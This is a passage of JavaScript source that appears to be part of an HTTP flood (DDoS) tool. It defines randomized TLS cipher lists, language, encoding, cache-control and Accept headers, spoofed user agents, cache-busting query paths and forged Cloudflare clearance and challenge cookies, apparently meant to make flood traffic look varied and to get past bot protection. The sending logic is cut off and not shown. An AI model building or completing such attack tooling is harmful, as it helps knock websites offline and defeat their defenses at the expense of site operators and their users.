  'ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384','ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-AES128-SHA256', 'ECDHE-RSA-AES128-SHA256', 'ECDHE-ECDSA-AES256-SHA384', 'ECDHE-RSA-AES256-SHA384','ECDHE-ECDSA-AES128-GCM-SHA256', 'ECDHE-ECDSA-CHACHA20-POLY1305', 'ECDHE-RSA-AES128-GCM-SHA256', 'ECDHE-RSA-CHACHA20-POLY1305', 'ECDHE-ECDSA-AES256-GCM-SHA384', 'ECDHE-RSA-AES256-GCM-SHA384', 'ECDHE-ECDSA-AES128-SHA256', 'ECDHE-RSA-AES128-SHA256', 'ECDHE-ECDSA-AES256-SHA384', 'ECDHE-RSA-AES256-SHA384', 'ECDHE-ECDSA-AES128-SHA', 'ECDHE-RSA-AES128-SHA', 'AES128-GCM-SHA256', 'AES128-SHA256', 'AES128-SHA', 'ECDHE-RSA-AES256-SHA', 'AES256-GCM-SHA384', 'AES256-SHA256', 'AES256-SHA',
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK','TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
  ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
  'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 ':ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
 'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
 'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
];

 const hihi = [ "require-corp", "unsafe-none", ];

const lang_header = [
  'en-US,en;q=0.9',
  'en-GB,en;q=0.9',
  'en-CA,en;q=0.9',
  'en-AU,en;q=0.9',
  'en-NZ,en;q=0.9',
  'en-ZA,en;q=0.9',
  'en-IE,en;q=0.9',
  'en-IN,en;q=0.9',
  'ar-SA,ar;q=0.9',
  'az-Latn-AZ,az;q=0.9',
  'be-BY,be;q=0.9',
  'bg-BG,bg;q=0.9',
  'bn-IN,bn;q=0.9',
  'ca-ES,ca;q=0.9',
  'cs-CZ,cs;q=0.9',
  'cy-GB,cy;q=0.9',
  'da-DK,da;q=0.9',
  'de-DE,de;q=0.9',
  'el-GR,el;q=0.9',
  'es-ES,es;q=0.9',
  'et-EE,et;q=0.9',
  'eu-ES,eu;q=0.9',
  'fa-IR,fa;q=0.9',
  'fi-FI,fi;q=0.9',
  'fr-FR,fr;q=0.9',
  'ga-IE,ga;q=0.9',
  'gl-ES,gl;q=0.9',
  'gu-IN,gu;q=0.9',
  'he-IL,he;q=0.9',
  'hi-IN,hi;q=0.9',
  'hr-HR,hr;q=0.9',
  'hu-HU,hu;q=0.9',
  'hy-AM,hy;q=0.9',
  'id-ID,id;q=0.9',
  'is-IS,is;q=0.9',
  'it-IT,it;q=0.9',
  'ja-JP,ja;q=0.9',
  'ka-GE,ka;q=0.9',
  'kk-KZ,kk;q=0.9',
  'km-KH,km;q=0.9',
  'kn-IN,kn;q=0.9',
  'ko-KR,ko;q=0.9',
  'ky-KG,ky;q=0.9',
  'lo-LA,lo;q=0.9',
  'lt-LT,lt;q=0.9',
  'lv-LV,lv;q=0.9',
  'mk-MK,mk;q=0.9',
  'ml-IN,ml;q=0.9',
  'mn-MN,mn;q=0.9',
  'mr-IN,mr;q=0.9',
  'ms-MY,ms;q=0.9',
  'mt-MT,mt;q=0.9',
  'my-MM,my;q=0.9',
  'nb-NO,nb;q=0.9',
  'ne-NP,ne;q=0.9',
  'nl-NL,nl;q=0.9',
  'nn-NO,nn;q=0.9',
  'or-IN,or;q=0.9',
  'pa-IN,pa;q=0.9',
  'pl-PL,pl;q=0.9',
  'pt-BR,pt;q=0.9',
  'pt-PT,pt;q=0.9',
  'ro-RO,ro;q=0.9',
  'ru-RU,ru;q=0.9',
  'si-LK,si;q=0.9',
  'sk-SK,sk;q=0.9',
  'sl-SI,sl;q=0.9',
  'sq-AL,sq;q=0.9',
  'sr-Cyrl-RS,sr;q=0.9',
  'sr-Latn-RS,sr;q=0.9',
  'sv-SE,sv;q=0.9',
  'sw-KE,sw;q=0.9',
  'ta-IN,ta;q=0.9',
  'te-IN,te;q=0.9',
  'th-TH,th;q=0.9',
  'tr-TR,tr;q=0.9',
  'uk-UA,uk;q=0.9',
  'ur-PK,ur;q=0.9',
  'uz-Latn-UZ,uz;q=0.9',
  'vi-VN,vi;q=0.9',
  'zh-CN,zh;q=0.9',
  'zh-HK,zh;q=0.9',
  'zh-TW,zh;q=0.9',
  'am-ET,am;q=0.8',
  'as-IN,as;q=0.8',
  'az-Cyrl-AZ,az;q=0.8',
  'bn-BD,bn;q=0.8',
  'bs-Cyrl-BA,bs;q=0.8',
  'bs-Latn-BA,bs;q=0.8',
  'dz-BT,dz;q=0.8',
  'fil-PH,fil;q=0.8',
  'fr-CA,fr;q=0.8',
  'fr-CH,fr;q=0.8',
  'fr-BE,fr;q=0.8',
  'fr-LU,fr;q=0.8',
  'gsw-CH,gsw;q=0.8',
  'ha-Latn-NG,ha;q=0.8',
  'hr-BA,hr;q=0.8',
  'ig-NG,ig;q=0.8',
  'ii-CN,ii;q=0.8',
  'is-IS,is;q=0.8',
  'jv-Latn-ID,jv;q=0.8',
  'ka-GE,ka;q=0.8',
  'kkj-CM,kkj;q=0.8',
  'kl-GL,kl;q=0.8',
  'km-KH,km;q=0.8',
  'kok-IN,kok;q=0.8',
  'ks-Arab-IN,ks;q=0.8',
  'lb-LU,lb;q=0.8',
  'ln-CG,ln;q=0.8',
  'mn-Mong-CN,mn;q=0.8',
  'mr-MN,mr;q=0.8',
  'ms-BN,ms;q=0.8',
  'mt-MT,mt;q=0.8',
  'mua-CM,mua;q=0.8',
  'nds-DE,nds;q=0.8',
  'ne-IN,ne;q=0.8',
  'nso-ZA,nso;q=0.8',
  'oc-FR,oc;q=0.8',
  'pa-Arab-PK,pa;q=0.8',
  'ps-AF,ps;q=0.8',
  'quz-BO,quz;q=0.8',
  'quz-EC,quz;q=0.8',
  'quz-PE,quz;q=0.8',
  'rm-CH,rm;q=0.8',
  'rw-RW,rw;q=0.8',
  'sd-Arab-PK,sd;q=0.8',
  'se-NO,se;q=0.8',
  'si-LK,si;q=0.8',
  'smn-FI,smn;q=0.8',
  'sms-FI,sms;q=0.8',
  'syr-SY,syr;q=0.8',
  'tg-Cyrl-TJ,tg;q=0.8',
  'ti-ER,ti;q=0.8',
  'tk-TM,tk;q=0.8',
  'tn-ZA,tn;q=0.8',
  'tt-RU,tt;q=0.8',
  'ug-CN,ug;q=0.8',
  'uz-Cyrl-UZ,uz;q=0.8',
  've-ZA,ve;q=0.8',
  'wo-SN,wo;q=0.8',
  'xh-ZA,xh;q=0.8',
  'yo-NG,yo;q=0.8',
  'zgh-MA,zgh;q=0.8',
  'zu-ZA,zu;q=0.8'
];

  const encoding_header = [
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate'
 ];
   
   const control_header = [ 
    'max-age=604800',
   'proxy-revalidate',
   'public, max-age=0',
   'max-age=315360000',
   'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
   's-maxage=604800',
   'max-stale',
   'public, immutable, max-age=31536000',
   'must-revalidate',
   'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
   'max-age=31536000,public,immutable',
   'max-age=31536000,public',
   'min-fresh',
   'private',
   'public',
   's-maxage',
   'no-cache',
   'no-cache, no-transform',
   'max-age=2592000',
   'no-store',
   'no-transform',
   'max-age=31557600',
   'stale-if-error',
   'only-if-cached',
   'max-age=0',
   'must-understand, no-store',
   'max-age=31536000; includeSubDomains',
   'max-age=31536000; includeSubDomains; preload',
   'max-age=120',
   'max-age=0,no-cache,no-store,must-revalidate',
   'public, max-age=604800, immutable',
   'max-age=0, must-revalidate, private',
   'max-age=0, private, must-revalidate',
   'max-age=604800, stale-while-revalidate=86400',
   'max-stale=3600',
   'public, max-age=2678400',
   'min-fresh=600',
   'public, max-age=30672000',
   'max-age=31536000, immutable',
   'max-age=604800, stale-if-error=86400',
   'public, max-age=604800',
   'no-cache, no-store,private, max-age=0, must-revalidate',
   'o-cache, no-store, must-revalidate, pre-check=0, post-check=0',
   'public, s-maxage=600, max-age=60',
   'public, max-age=31536000',
   'max-age=14400, public',
   'max-age=14400',
   'max-age=600, private',
   'public, s-maxage=600, max-age=60',
   'no-store, no-cache, must-revalidate',
   'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  ];

 const Methods = [
    "GET",
    "HEAD",
    "POST",
    "PUT",
    "DELETE",
    "CONNECT",
    "OPTIONS",
    "TRACE",
    "PATCH",
  ];
  
  const kontol = Methods[Math.floor(Math.floor(Math.random() * Methods.length))];
    
const extensions = [
    '.net', '.com', '.org', '.info', '.xyz', '.co', '.io', 
    '.biz', '.us', '.me', '.tv', '.mobi', '.cc', '.ws', 
    '.online', '.site', '.tech', '.space', '.store', '.website', 
    '.app', '.dev', '.ai', '.cloud', '.guru', '.network', 
    '.global', '.life', '.today', '.world'
];

const randomExtension = extensions[Math.floor(Math.random() * extensions.length)];
const refers = 'https://' + randstr(6) + randomExtension;

 useragents = [
    '(CheckSecurity 2_0)',
    '(BraveBrowser 5_0)',
    '(ChromeBrowser 3_0)',
    '(ChromiumBrowser 4_0)',
    '(AtakeBrowser 2_0)',
    '(NasaChecker)',
    '(CloudFlareIUAM)',
    '(NginxChecker)',
    '(AAPanel)',
    '(AntiLua)',
    '(FushLua)',
    '(FBIScan)',
    '(FirefoxTop)',
    '(ChinaNet Bot)'
   ];

   const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv",
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/x-www-form-urlencoded,text/plain,application/json,application/xml,application/xhtml+xml,text/css,text/javascript,application/javascript,application/xml-dtd,text/csv,application/vnd.ms-excel"  
 ]; 

 
 const queryStrings = [
    "&", 
    "=", 
  ];

  Object.prototype.shuffle = function () {
    const entries = Object.entries(this);
    for (let entry = entries.length - 1; entry > 0; entry--) {
        const index = randInt(0, entry + 1);
        [entries[entry], entries[index]] = [entries[index], entries[entry]];
    }
    return Object.fromEntries(entries);
 }
  
  const pathts = [
    "?page=1",
    "?page=2",
    "?page=3",
    "?category=news",
    "?category=sports",
    "?category=technology",
    "?category=entertainment", 
    "?sort=newest",
    "?filter=popular",
    "?limit=10",
    "?start_date=1989-06-04",
    "?end_date=1989-06-04",
    "/?r=*****",
    "/?r=12364",
    "/?r=16364",
    "/?r=65655",
    "/?r=65955",
    "/?r=14254",
    "/?r=12654",
    "/?r=66455",
    "/?r=18694",
    "/?r=12364",
    "/?r=6566664645",
    "/?r=125234",
    "/?r=16365",
    "/?r=16354",
    "/?r=123964",
    "/?r=656664645",
    "/?r=12524",
    "/?r=163665",
    "/?r=16354",
    "/?r=12334",
    "/?a=[+F10]&b=[+N5]",
    "/?a=[+F1]&b=[+N5]",
    "/?a=[+F130]&b=[+N52]",
    "/?a=[+F1042]&b=[+N52]",
    "/?a=[+F16685]&b=[+N5]",
    "/?a=[+F8551]&b=[+N5]",
    "/?a=[+F130]&b=[+N52]",
    "/?a=[+F1042]&b=[+N52]",
    "/?a=[+F10]&b=[+N5]",
    "/?a=[+F56551]&b=[+N5]",
    "/?a=[+F1350]&b=[+N52]",
    "/?a=[+F1520]&b=[+N52]",
    "/?uername=zlq&age=20",
    "/?uername=zlq&age=2",
    "?__cf_chl_tk=",
    "?__cf_chl_rt_tk=",
    "/?yqlaje=an4ux1&amp;__CBK=3f3c8201870c33a8b8c92687ed8a1698d1603344084_326369&amp;wmnqjm=agpws2&amp;naxyty=jxxv22&amp;fktade=draxv1&amp;qybcjc=4pyt12&amp;vunwfk=dgwq82&qifuha=gk0u32",
];

// Function to get a random cookie
function getRandomCookie() {
    const cookies = [
        'cf_clearance=' + randstr(25),
        '__cf_bm=' + randstr(16),
        '__cfduid=' + randstr(43),
        '__cf_chl_rt_tk=' + randstr(43),
